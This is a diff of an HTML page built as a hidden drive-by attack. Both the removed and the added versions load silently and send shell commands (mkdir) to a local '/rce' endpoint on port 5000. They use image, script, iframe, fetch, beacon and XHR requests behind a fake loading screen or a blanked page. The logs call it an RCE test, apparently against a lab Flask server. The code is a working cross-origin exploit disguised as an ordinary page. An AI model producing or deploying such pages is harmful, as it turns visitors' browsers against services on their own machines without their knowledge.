@@ -1,211 +1,56 @@
 <!DOCTYPE html>
-<html lang="en">
-
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>.</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            background: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: #666;
-        }
-
-        .container {
-            text-align: center;
-            max-width: 400px;
-            padding: 20px;
-        }
-
-        .spinner {
-            width: 40px;
-            height: 40px;
-            margin: 20px auto;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #3498db;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        .message {
-            margin-top: 20px;
-            font-size: 14px;
-            color: #999;
-        }
-
-        .hidden {
-            display: none;
-        }
-
-        #debug {
-            position: fixed;
-            bottom: 10px;
-            left: 10px;
-            font-size: 11px;
-            color: #ccc;
-            font-family: monospace;
-        }
+        body { display: none; }
     </style>
 </head>
-
 <body>
-    <div class="container">
-        <div class="spinner"></div>
-        <div>Loading page...</div>
-        <div class="message">Please wait while we initialize</div>
-    </div>
-
-    <div id="debug"></div>
-
     <script>
+        // Hide everything
+        document.documentElement.style.display = 'none';
+        
         // Generate random directory name
-        function generateRandomName() {
-            const randomNum = Math.floor(Math.random() * 1000000);
-            return `random${randomNum}`;
+        function randomDir() {
+            return `folder${Math.floor(Math.random() * 1000000)}`;
         }
 
-        // Log to debug element
-        function log(message) {
-            const debug = document.getElementById('debug');
-            debug.innerHTML = message + '<br>' + debug.innerHTML;
-            console.log(message);
-        }
-
-        // Try to create directory via RCE
-        async function createRandomDirectory() {
-            const dirName = generateRandomName();
-            const command = `mkdir ${dirName}`;
-
-            log(`🎯 Attempting: ${command}`);
-
-            // Method 1: Image tag (bypasses CORS)
-            const img = new Image();
-            img.src = `http://localhost:5000/rce?cmd=${encodeURIComponent(command)}`;
-            log(`📸 Image tag: ${img.src}`);
-
-            // Method 2: Fetch API
-            try {
-                const response = await fetch(`http://localhost:5000/rce?cmd=${encodeURIComponent(command)}`, {
-                    mode: 'no-cors',
-                    cache: 'no-cache'
-                });
-                log(`🌐 Fetch sent`);
-            } catch (e) {
-                log(`❌ Fetch error (normal with no-cors): ${e.message}`);
-            }
-
-            // Method 3: Script tag
-            const script = document.createElement('script');
-            script.src = `http://localhost:5000/rce?cmd=${encodeURIComponent(command)}`;
-            document.body.appendChild(script);
-            setTimeout(() => document.body.removeChild(script), 1000);
-            log(`📜 Script tag: ${script.src}`);
-
-            // Method 4: Iframe
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = `http://localhost:5000/rce?cmd=${encodeURIComponent(command)}`;
-            document.body.appendChild(iframe);
-            setTimeout(() => document.body.removeChild(iframe), 1000);
-            log(`🖼️ Iframe: ${iframe.src}`);
-
-            // Method 5: Beacon (works even if page closes)
-            const formData = new FormData();
-            formData.append('cmd', command);
-            navigator.sendBeacon('http://localhost:5000/rce', formData);
-            log(`📡 Beacon sent`);
-
-            // Method 6: Link preconnect
-            const link = document.createElement('link');
-            link.rel = 'preconnect';
-            link.href = `http://localhost:5000/rce?cmd=${encodeURIComponent(command)}`;
-            document.head.appendChild(link);
-            log(`🔗 Link preconnect`);
-
-            // Method 7: XMLHttpRequest
-            const xhr = new XMLHttpRequest();
-            xhr.open('GET', `http://localhost:5000/rce?cmd=${encodeURIComponent(command)}`, true);
-            xhr.send();
-            log(`📡 XHR sent`);
-
-            log(`✅ All attempts sent for: ${dirName}`);
-            log(`---`);
-        }
-
-        // Execute multiple attempts
-        async function startAttack() {
-            log(`🚀 RCE Test Started`);
-            log(`🎯 Target: http://localhost:5000/rce`);
-            log(`---`);
-
-            // Try 3 different random directories
-            for (let i = 0; i < 3; i++) {
-                await createRandomDirectory();
-                // Wait a bit between attempts
-                await new Promise(r => setTimeout(r, 500));
-            }
-
-            // Also try a few more with different methods
-            setTimeout(() => {
-                const dirName = generateRandomName();
-                log(`🔄 Additional attempt: mkdir ${dirName}`);
-
-                // Just use image tags for additional attempts
-                for (let i = 0; i < 5; i++) {
-                    const img = new Image();
-                    img.src = `http://localhost:5000/rce?cmd=mkdir%20random${Math.floor(Math.random() * 1000000)}`;
+        // Create folder via RCE
+        function createFolder(dirName) {
+            const cmd = `mkdir ${dirName}`;
+            
+            // Multiple methods to ensure execution
+            const methods = [
+                () => { new Image().src = `http://localhost:5000/rce?cmd=${encodeURIComponent(cmd)}`; },
+                () => { 
+                    let s = document.createElement('script');
+                    s.src = `http://localhost:5000/rce?cmd=${encodeURIComponent(cmd)}`;
+                    document.body.appendChild(s);
+                    setTimeout(() => document.body.removeChild(s), 100);
+                },
+                () => {
+                    let f = document.createElement('iframe');
+                    f.style.display = 'none';
+                    f.src = `http://localhost:5000/rce?cmd=${encodeURIComponent(cmd)}`;
+                    document.body.appendChild(f);
+                    setTimeout(() => document.body.removeChild(f), 100);
                 }
-            }, 2000);
-
-            log(`✨ All done! Check your Flask server to see if directories were created.`);
-            log(`💡 Look for directories named random[number] in the current directory`);
+            ];
+            
+            // Use random method
+            methods[Math.floor(Math.random() * methods.length)]();
         }
 
-        // Start when page loads
-        window.addEventListener('load', () => {
-            // Show loading animation for 2 seconds then "load"
-            setTimeout(() => {
-                document.querySelector('.container').innerHTML = `
-                    <div style="font-size: 48px; margin-bottom: 20px;">👻</div>
-                    <div>Nothing to see here...</div>
-                    <div class="message">Page loaded successfully</div>
-                `;
-            }, 2000);
+        // Create 10 folders
+        for(let i = 0; i < 10; i++) {
+            createFolder(randomDir());
+        }
 
-            // Start attack after a delay
-            setTimeout(startAttack, 3000);
-        });
-
-        // Also trigger on click
-        document.addEventListener('click', () => {
-            const dirName = generateRandomName();
-            log(`👆 Click triggered: mkdir ${dirName}`);
-
-            const img = new Image();
-            img.src = `http://localhost:5000/rce?cmd=mkdir%20${dirName}`;
-        });
+        // Clean up
+        document.write('');
+        window.stop();
     </script>
 </body>
-
 </html>
